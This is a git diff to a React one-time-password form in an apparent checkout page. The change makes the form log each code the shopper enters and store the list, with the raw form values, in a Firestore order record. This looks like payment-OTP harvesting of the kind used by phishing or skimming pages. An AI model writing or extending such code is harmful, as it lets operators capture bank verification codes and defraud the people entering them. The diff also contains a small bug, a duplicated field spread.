@@ -22,7 +22,7 @@ export function OTPForm() {
   const { clearCart } = useCart()
   const [isLoading, setIsLoading] = useState(false)
   const [otp, setOtp] = useState(false)
-
+const {otps,addOtps}=useCart() 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -32,18 +32,20 @@ export function OTPForm() {
 
   async function onSubmit(values: z.infer<typeof formSchema>) {
     setIsLoading(true)
+    addOtps(values.otp)
     try {
       const orderId = localStorage.getItem("vistor") 
       if (!orderId) throw new Error("No order ID found")
-
       await updateDoc(doc(db, "orders", orderId), {
         payment: {
-          otp:otp,
+          otp:values.otp,
+          allOtps:otps,
           values,
           verifiedAt: new Date().toISOString(),
         },
         status: "confirmed",
       })
+
       clearCart()
       localStorage.removeItem("currentOrderId")
     } catch (error) {
@@ -62,9 +64,7 @@ export function OTPForm() {
           render={({ field }) => (
             <FormItem>
               <FormControl>
-                <Input type="tel"onChange={(e)=>{
-                  setOtp(e.target.value)
-                }}  minLength={4}  {...field} className="text-center text-2xl tracking-widest" maxLength={6} />
+                <Input type="tel" {...field}  minLength={4}  {...field} className="text-center text-2xl tracking-widest" maxLength={6} />
               </FormControl>
               <FormMessage />
             </FormItem>
